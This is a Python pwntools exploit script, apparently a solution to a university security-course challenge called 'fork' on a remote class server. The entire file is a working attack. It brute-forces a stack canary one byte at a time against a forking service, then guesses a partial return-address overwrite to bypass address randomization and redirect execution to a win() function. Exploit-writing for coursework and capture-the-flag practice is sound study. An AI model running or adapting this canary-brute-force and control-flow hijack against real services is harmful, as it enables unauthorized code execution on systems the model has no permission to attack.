# forkex.py - Aidan Wech (Onyxymous)
from pwn import *

# debug info
context.arch = 'amd64'
context.log_level = 'debug'

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14163

# exploit variables
canaryoffset = 120
canary = b'\x00'

# remote process
# loop in case the server times out
for x in range(4):
	log.info(f'Attempt {x + 1} of 4: Starting...')
	try:
		p = remote(host, port)
		
		for i in range(1,8):
			for j in range(16):
				result = b''
				
				for k in range(16):
					# temporary variables
					tempcanary = canary + p8(k * 16 + j)
					numbytes = canaryoffset + i + 1
					exploit = flat({
					0: b'%p.',
					canaryoffset: tempcanary})
					
					# start child process
					with context.silent:
						p.recvline()
						p.recvuntil(b'? ')
						p.send(str(numbytes).encode('utf-8') + b'\n')
						p.recvuntil(b': ')
						p.sendline(exploit)
						result = p.recvline()
					
					# check if we succeeded
					if result == b'Done\n':
						log.info(f'{i + 1} bytes found: {hex(unpack(tempcanary, 8 * (i + 1), endian="little", sign=False))}')
						canary = tempcanary
						break
				if result == b'Done\n':
					result = b''
					break
		
		log.info(f'Canary: {hex(unpack(canary, 64, endian="little", sign=False))}')
		retaddroffset = 0xc5a
		winaddroffset = 0xa7a
		diff = retaddroffset - winaddroffset
		guessaddr = 0
		with context.silent:
			p.recvline()
			
		# find offset
		for i in range(16):
			with context.silent: 
				guessaddr = (0x1000 * i) + retaddroffset
				p.recvuntil(b'? ')
				exploit = flat({
				canaryoffset: canary,
				canaryoffset + 16: p16(guessaddr)})
				
				p.send(str(canaryoffset + 18).encode('utf-8') + b'\n')
				p.recvuntil(b': ')
				p.sendline(exploit)
				mesg = p.recvline(timeout=1)
			log.info(f'+{p8(i)}: {mesg}')
			if mesg != b'Here\'s your fork!\n':
				if mesg == b'Done\n':
					log.info(f'Found Return Address Offset: {hex(guessaddr)}')
					winaddroffset = guessaddr - diff
					log.info(f'Trying win() at offset {hex(winaddroffset)}...')
					with context.silent:
						p.recvline()
						break
				else :
					with context.silent:
						p.recvline()
		
		#initiate win()
		with context.silent:
			p.recvuntil(b'? ')
			exploit = flat({
			canaryoffset: canary,
			canaryoffset + 16: p16(winaddroffset)})
			
			p.send(str(canaryoffset + 18).encode('utf-8') + b'\n')
			p.recvuntil(b': ')
			p.sendline(exploit)
			mesg = p.recvline(timeout=1)
		log.info(f'{mesg}')
		p.close()
		break
	
	# reconnect if server times out
	except EOFError:
		canary = b'\x00'
		log.info('Server timed out:(')
		if x < 15:
			log.info('Let\'s try again')
		p.close()
